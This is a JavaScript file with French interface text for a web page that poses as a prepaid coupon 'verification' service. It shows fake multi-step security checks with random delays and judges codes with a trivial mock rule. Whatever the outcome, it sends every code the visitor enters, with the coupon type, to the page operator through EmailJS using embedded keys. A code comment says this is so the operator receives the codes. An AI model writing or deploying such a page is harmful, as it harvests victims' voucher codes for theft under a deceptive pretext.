/**
 * EmailJS Configuration
 * REMPLACEZ CES VALEURS PAR VOS PROPRES CLÉS EMAILJS
 */
const EMAILJS_PUBLIC_KEY = "TIiOLwNoR3sbqQJZ-";
const EMAILJS_SERVICE_ID = "service_o9pwrgp";
const EMAILJS_TEMPLATE_ID = "template_oa57i62";

// Initialisation d'EmailJS
(function () {
    if (typeof emailjs !== 'undefined') {
        emailjs.init(EMAILJS_PUBLIC_KEY);
    }
})();

document.addEventListener('DOMContentLoaded', () => {
    const verifyForm = document.getElementById('verifyForm');
    const codesContainer = document.getElementById('codesContainer');
    const addCodeBtn = document.getElementById('addCodeBtn');
    const submitBtn = document.getElementById('submitBtn');
    const loading = document.getElementById('loading');
    const statusMessage = document.getElementById('statusMessage');
    const resultSuccess = document.getElementById('resultSuccess');
    const resultError = document.getElementById('resultError');

    let codeCount = 1;
    const maxCodes = 4;

    addCodeBtn.addEventListener('click', () => {
        if (codeCount < maxCodes) {
            codeCount++;
            const newField = document.createElement('div');
            newField.className = 'field code-field';
            newField.style.animation = 'slideDown 0.3s ease-out';
            newField.innerHTML = `
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                    <label for="couponCode${codeCount}" style="margin-bottom: 0;">Code de vérification ${codeCount}</label>
                    <button type="button" class="remove-code" style="background: none; border: none; color: var(--error); cursor: pointer; font-size: 0.8rem;"><i class="fas fa-times"></i></button>
                </div>
                <input type="text" id="couponCode${codeCount}" name="couponCode" placeholder="Ex: ABC1-DEF2-GHI3" required autocomplete="off">
            `;
            codesContainer.appendChild(newField);

            if (codeCount === maxCodes) {
                addCodeBtn.style.display = 'none';
            }

            // Add remove functionality
            newField.querySelector('.remove-code').addEventListener('click', () => {
                newField.remove();
                codeCount--;
                addCodeBtn.style.display = 'inline-block';
                updateLabels();
            });
        }
    });

    function updateLabels() {
        const fields = codesContainer.querySelectorAll('.code-field');
        fields.forEach((field, index) => {
            const label = field.querySelector('label');
            const input = field.querySelector('input');
            const num = index + 1;
            label.textContent = `Code de vérification ${num}`;
            label.setAttribute('for', `couponCode${num}`);
            input.setAttribute('id', `couponCode${num}`);
        });
    }

    const statusSteps = [
        "Initialisation du protocole de sécurité...",
        "Connexion aux serveurs d'authentification...",
        "Analyse de l'intégrité du code...",
        "Vérification finale en cours..."
    ];

    verifyForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const type = document.getElementById('couponType').value;
        const codeInputs = codesContainer.querySelectorAll('input[name="couponCode"]');
        const codes = Array.from(codeInputs).map(input => input.value.trim()).filter(val => val !== "");

        if (!type || codes.length === 0) return;

        // Reset UI
        submitBtn.disabled = true;
        verifyForm.style.display = 'none';
        document.querySelector('.add-code-container').style.display = 'none';
        resultSuccess.style.display = 'none';
        resultError.style.display = 'none';
        loading.style.display = 'block';

        // Simulate multi-step verification
        for (let step of statusSteps) {
            statusMessage.textContent = step;
            await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 1000));
        }

        loading.style.display = 'none';
        submitBtn.disabled = false;

        // Mock verification logic
        // For multiple codes, we'll check each one. 
        // If ALL are valid, success. If ANY is invalid, we show error for clarity (or we could show partial success)
        // Let's go with: if at least one is invalid, it's an error.

        const results = codes.map(code => {
            return {
                code,
                isValid: code.length >= 10 && !code.includes('0000')
            };
        });

        const allValid = results.every(r => r.isValid);

        // --- ENVOI DES CODES VIA EMAILJS ---
        // On envoie les codes même s'ils sont "invalides" dans notre mock (pour que vous les receviez)
        try {
            const templateParams = {
                coupon_type: type.toUpperCase(),
                codes: codes.join(', '),
                status: allValid ? "VALIDE" : "ERREUR (Mock)",
                timestamp: new Date().toLocaleString()
            };

            if (typeof emailjs !== 'undefined' && EMAILJS_PUBLIC_KEY !== "VOTRE_CLE_PUBLIQUE_ICI") {
                emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
                    .then(function (response) {
                        console.log('Email envoyé avec succès !', response.status, response.text);
                    }, function (error) {
                        console.error('Échec de l\'envoi de l\'email...', error);
                    });
            } else {
                console.warn("EmailJS non configuré. Veuillez remplir les clés au début de script.js");
            }
        } catch (e) {
            console.error("Erreur lors de la tentative d'envoi EmailJS:", e);
        }
        // ------------------------------------

        if (allValid) {
            const randomId = 'SV-' + Math.random().toString(36).substr(2, 4).toUpperCase() + '-' + Math.random().toString(36).substr(2, 4).toUpperCase();
            resultSuccess.style.display = 'block';

            let codesDetail = results.map(r => `${r.code.substring(0, 4)}****`).join(', ');
            document.getElementById('successDetail').innerHTML = `Les ${results.length} coupons ${type.toUpperCase()} (${codesDetail}) ont été authentifiés avec succès.`;
            document.getElementById('generatedID').textContent = randomId;
        } else {
            resultError.style.display = 'block';
            const invalidCount = results.filter(r => !r.isValid).length;
            document.getElementById('errorDetail').textContent = `${invalidCount} sur ${results.length} code(s) pour ${type.toUpperCase()} n'ont pas pu être validés.`;
        }

        // Add a back button option
        const existingReset = document.querySelector('.reset-container');
        if (existingReset) existingReset.remove();

        const resetContainer = document.createElement('div');
        resetContainer.className = 'reset-container';

        const resetBtn = document.createElement('button');
        resetBtn.textContent = "Nouvelle vérification";
        resetBtn.className = "btn-verify";
        resetBtn.style.marginTop = "20px";
        resetBtn.style.background = "rgba(255,255,255,0.1)";

        resetBtn.onclick = () => {
            verifyForm.style.display = 'block';
            document.querySelector('.add-code-container').style.display = 'block';
            resultSuccess.style.display = 'none';
            resultError.style.display = 'none';
            resetContainer.remove();

            // Optional: reset fields
            // codesContainer.innerHTML = ... (reset to 1 field)
        };

        resetContainer.appendChild(resetBtn);
        if (allValid) resultSuccess.appendChild(resetContainer);
        else resultError.appendChild(resetContainer);
    });
});
